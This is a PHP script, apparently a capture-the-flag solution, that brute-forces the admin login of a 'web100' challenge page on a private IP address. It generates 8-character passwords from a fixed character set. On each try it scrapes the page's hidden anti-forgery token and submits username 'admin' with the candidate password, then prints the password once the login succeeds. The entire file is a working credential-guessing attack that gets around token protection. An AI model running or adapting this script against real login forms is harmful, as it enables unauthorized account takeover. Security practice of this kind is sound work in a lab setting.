<?php
include_once 'wordlistgenerator.class.php';
for ($i=8;$i<=8;$i++)
{
	$ws = new WordlistGenerator($i,'bc0589');
	while($ws->isNext()) {
		$password = $ws->getWord();
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,"http://192.168.10.1/web100/web100e3c51f36bf6b8420bc97cef52fee61e5b8bc7a982f7512c87d0776d64bf9cc24.php");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$server_output = curl_exec ($ch);
		curl_close ($ch);
		preg_match_all('#<input type="hidden" name="token" value="(.*?)"/>#', $server_output, $token);
		$token = $token[1][0];
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,"http://192.168.10.1/web100/web100e3c51f36bf6b8420bc97cef52fee61e5b8bc7a982f7512c87d0776d64bf9cc24.php?action=login");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS,
					"username=admin&password=".$password."&token=".$token);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$server_output = curl_exec ($ch);
		curl_close ($ch);
		
		if(strstr($server_output, "Login failed.")){
			// echo "hatali";
		}else{
			echo "cozuldu  - pass : ".$password." - token : ".$token;
		}
		$ws->nextWord();
	}
	unset($ws);
}
?>
